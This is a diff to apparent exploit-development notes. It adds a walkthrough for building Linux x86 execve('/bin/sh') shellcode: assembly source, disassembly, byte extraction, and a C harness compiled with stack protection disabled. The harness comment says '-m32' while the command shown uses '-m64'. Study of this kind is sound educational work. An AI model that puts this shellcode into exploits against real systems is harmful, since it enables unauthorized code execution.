@@ -73,6 +73,82 @@ uid=1000(user) gid=1000(user) groups=1000(user)
 ```
 
 
+# &#35; linux x86
+#### Linux system call table : <https://chromium.googlesource.com/chromiumos/docs/+/master/constants/syscalls.md/>
+#### get shellcode to binary : <https://www.commandlinefu.com/commands/view/6051/get-all-shellcode-on-binary-file-from-objdump>
+
+```bash
+$ cat shell32.s
+; nasm -f elf32 shell32.s -o shell32.o
+; ld -m elf_i386 -s shell32.o -o shell32
+; echo "\"$(objdump -d ./shell32 | grep '[0-9a-f]:' | cut -d$'\t' -f2 | grep -v 'file' | tr -d " \n" | sed 's/../\\x&/g')\""
+
+
+section .text
+    global _start
+
+_start:
+    xor eax,eax		; safe null
+    push eax		; push null byte onto stack
+    push 0x68732f2f 	; push /bin//sh
+    push 0x6e69622f
+    mov ebx,esp		; set ebx to out cmd
+    mov ecx,eax		; no args
+    mov edx,eax		; no args again
+    mov al,0xb		; set sys_execve
+    int 0x80
+
+
+$ nasm -f elf32 shell32.s -o shell32.o
+$ ld -m elf_i386 -s shell32.o -o shell32
+$ ./shell32
+$ id
+uid=1000(user) gid=1000(user) groups=1000(user)
+
+$ objdump -M intel -D ./shell32
+
+./shell32:     file format elf32-i386
+
+
+Disassembly of section .text:
+
+08049000 <.text>:
+ 8049000:	31 c0                	xor    eax,eax
+ 8049002:	50                   	push   eax
+ 8049003:	68 2f 2f 73 68       	push   0x68732f2f
+ 8049008:	68 2f 62 69 6e       	push   0x6e69622f
+ 804900d:	89 e3                	mov    ebx,esp
+ 804900f:	89 c1                	mov    ecx,eax
+ 8049011:	89 c2                	mov    edx,eax
+ 8049013:	b0 0b                	mov    al,0xb
+ 8049015:	cd 80                	int    0x80
+
+$ echo "\"$(objdump -d ./shell32 | grep '[0-9a-f]:' | cut -d$'\t' -f2 | grep -v 'file' | tr -d " \n" | sed 's/../\\x&/g')\""
+"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80"
+
+
+$ cat shell32.c
+// gcc -m32 -fno-stack-protector -z execstack shell32.c -o shell
+
+#include <stdio.h>
+
+int main()
+{
+    unsigned char shellcode[] = \
+        "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80";
+    int (*ret)() = (int(*)())shellcode;
+    ret();
+}
+
+$ gcc -m64 -fno-stack-protector -z execstack shell32.c -o shell
+$ ./shell
+$ id
+uid=1000(user) gid=1000(user) groups=1000(user)
+
+```
+
+
+
 # &#35; linux x86 using Metasploit
 
 ```bash
